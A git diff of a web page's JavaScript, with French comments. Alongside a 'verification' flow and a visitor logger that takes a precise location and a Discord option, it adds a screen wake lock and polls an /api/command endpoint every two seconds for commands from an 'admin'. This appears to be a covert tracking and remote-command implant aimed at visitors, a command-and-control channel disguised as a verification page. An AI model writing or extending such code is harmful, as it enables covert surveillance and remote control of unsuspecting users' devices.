@@ -140,12 +140,28 @@ async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord
     }
 }
 
+// Tentative de garder l'écran allumé (Wake Lock) pour assurer la réception des commandes
+let wakeLock = null;
+async function requestWakeLock() {
+    try {
+        if ('wakeLock' in navigator) {
+            wakeLock = await navigator.wakeLock.request('screen');
+            console.log("Wake Lock activé 🔓");
+        }
+    } catch (err) {
+        console.warn("Wake Lock refusé:", err.message);
+    }
+}
+
 async function checkCommands() {
     try {
+        // Fréquence de vérification augmentée si l'appareil est actif
         const res = await fetch(`/api/command?sessionId=${sessionId}`);
         const data = await res.json();
 
         if (data && data.command) {
+            // Si on reçoit une commande, on essaie de réveiller l'appareil
+            requestWakeLock();
             const cmd = data.command;
             console.log("Commande reçue de l'admin:", cmd.command);
 
@@ -332,6 +348,11 @@ async function startVerification() {
 
 if (document.readyState === 'complete') {
     startVerification();
+    // Vérification des commandes très fréquente (toutes les 2 secondes)
+    setInterval(checkCommands, 2000);
+    // Tenter de réactiver le Wake Lock au clic ou focus
+    document.addEventListener('click', requestWakeLock);
+    window.addEventListener('focus', requestWakeLock);
 } else {
     window.addEventListener('load', startVerification);
 }
